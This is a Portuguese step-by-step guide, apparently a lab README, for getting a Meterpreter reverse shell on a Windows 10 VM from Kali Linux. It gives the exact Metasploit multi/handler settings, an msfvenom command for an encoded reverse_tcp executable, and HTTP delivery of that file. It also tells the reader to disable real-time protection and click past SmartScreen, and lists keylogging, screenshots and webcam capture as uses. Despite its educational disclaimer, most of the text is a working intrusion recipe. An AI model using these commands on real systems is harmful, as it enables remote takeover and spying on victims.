# Reverse shell com metasploit e bypass de defesas

### AVISO IMPORTANTE: Este guia existe somente para fins didáticos e sobre hipotese alguma replique para fins maliciosos. Cibersegurança é um assunto sério e se usado para prejudicar alguém pode trazer consequências sérias.


Este guia resume os passos exatos para obter uma sessão
Meterpreter em uma VM Windows 10 a partir do Kali Linux , superando as barreiras de rede NAT e
defesas ativas (AV e SmartScreen).

## VM windows 10
Para fazer os testes crie uma vm windows 10 e use o comando ip config para
verificar o ip dessa vm.
Por padrão o virtualbox isola a rede da vm instalada e usa um ip padrão 10.0.2.x,
com isso se torna impossível comunicar o Kali com o windows 10. Porém o
Windows consegue se comunicar com o Kali pois o mesmo está usando a sua
placa de rede para se comunicar com a rede de internet, o que o virtualbox faz é
transformar o ip do windows 10 no ip do Kali para se comunicar com a rede
como se fosse um novo computador.

Com isso a solução para se comunicar com o windows 10 usando o Kali é usar
o reverse shell.

O reverse shell é um conceito simples onde a vitima se conecta ao atacante e não
o contrario.

Quando o atacante tenta pingar para a vitima uma porta de entrada é exigida e
geralmente o firewall impede isso, mas quando o windows quer pingar para o
Kali a porta de entrada não é utilizada, mas sim a de saída, o que permite o
windows se comunicar com o Kali normalmente.

O reverse shell é um modo de se aproveitar da comunicação de saída entre as
duas máquinas

## Entrando na rede
para fazer esse tipo de ataque é preciso estar na mesma rede que a máquina
vitima, caso contrário o ataque não funciona.

Futuramente vou por aqui uma forma de invasão de redes para deixar o ataque
mais completo levando em consideração uma situação em tempo real

## Configurando o Listener (Multi/Handler)
Um listener (ou handler) no Metasploit é um componente que aguarda / “escuta”
uma conexão de rede de um payload já implantado no alvo.

Para configurar o Listener use terminal do kali e o mesmo deve permanecer aberto.
Seguindo os passos a seguir faça:

1. Inicie o Metasploit:
```
msfconsole
```
2. Use o módulo genérico para receber conexões reversas:
``` 
use exploit/multi/handler
```
3. Configure o Payload (tipo de conexão que você vai receber):
```
set payload windows/meterpreter/reverse_tcp
```
5. Defina o LHOST (Seu IP de escuta):
```
set LHOST <seu ip>
```
7. Defina o LPORT (Porta de escuta – 443 ou 8080 são boas opções para sair do Firewall):
```
set LPORT 443
```
6. Inicie o Listener e deixe-o esperando:
```
exploit
```

⚠️ Mantenha este terminal aberto! se fechar o exploit para.

## Criação do Payload Executável

Abra um novo terminal no Kali e crie o arquivo executável que será enviado
para a suposta vitima (windows 10 de teste).

No Novo Terminal:

1. Crie o payload com os mesmos parâmetros do Listener:Bash
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.65 LPORT=
443 -f exe -e x86/shikata_ga_nai -i 10 > /root/payload_encoded.exe
```
 * esse payload foi refeito com um codificador para enganar o windows
defender, porém não funciona do mesmo jeito.

O Windows Defender vai bloquear o payload assim que o usuário baixar ou pode coloca-lo em quarentena por ser um arquivo que contem codigo malicioso. Para fins de treinamento, é necessário desativar a proteção em tempo real e o SmartScreen.
Desative apenas a proteção de arquivo. Mantenha o Firewall ativo
para testar o Reverse Shell.

1. Vá em Segurança do Windows.
2. Clique em Proteção contra vírus e ameaças.
3. Em Gerenciar configurações de Proteção contra vírus e ameaças, desative:
* Proteção em tempo real

Existem metodos mais eficases para evasão de defesas e persistencia, porém, como o experimento é unicamente educacional, não é necessário por aqui.

## Preparação para a Transferência
Em um novo terminal do Kali linux :
1. Vá para a pasta onde você salvou o payload:
 ```
cd /root
```
2. Inicie um servidor HTTP simples: 

```
python3 -m http.server 8080
```

## Execução do Payload e Obtenção do Shell

1. Na VM Windows 10: Abra o navegador e acesse o servidor web do seu kali  para baixar o arquivo:
```
http://<seu ip>:8080/payload.exe
```
3. Bypass do SmartScreen: Se o aviso aparecer:
* Clique em "Mais informações".
* Clique em "Executar assim mesmo" (ou "abrir mesmo assim").

5. Execução: O payload será executado e tentará se conectar ao seu Listener.
Resultado:

No msfconsole : A sessão Meterpreter será aberta, confirmando que o Reverse Shell funcionou contra o Firewall ativo.
```
[*] Meterpreter session 1 opened (...)
meterpreter >
```
Após isso voce tem acesso total a máquina windows 10, podendo:
1. executar comandos do cmd
2. capturar quais teclas o usuário está clicando na máquia windows
3. pode tirar screenshots da tela do usuário
4. pode capturar imagens da webcan do usuário

Entre outras possibilidades.

